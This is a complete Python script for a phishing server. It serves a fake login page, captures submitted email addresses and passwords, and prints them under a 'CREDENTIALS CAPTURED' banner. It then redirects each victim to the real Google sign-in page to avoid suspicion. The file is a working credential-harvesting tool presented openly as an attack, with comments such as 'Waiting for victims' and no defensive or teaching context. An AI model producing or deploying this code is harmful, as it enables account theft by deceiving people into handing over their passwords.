import http.server
import socketserver
import urllib.parse

PORT = 8080

class PhishingRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve the login page for the root URL
        if self.path == '/':
            self.path = '/login.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == '/login':
            # Get the length of the data
            content_length = int(self.headers['Content-Length'])
            # Read the data
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)
            
            # --- ATTACKER ACTION ---
            print("\n[!] CREDENTIALS CAPTURED:")
            print(f"    Email: {parsed_data.get('email', [''])[0]}")
            print(f"    Password: {parsed_data.get('password', [''])[0]}")
            print("-" * 30)
            # -----------------------

            # Redirect user to the REAL Google login to avoid suspicion
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com/signin')
            self.end_headers()
        else:
            self.send_error(404)

print(f"[*] Phishing Server started at http://localhost:{PORT}")
print("[*] Waiting for victims...")

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), PhishingRequestHandler) as httpd:
    httpd.serve_forever()
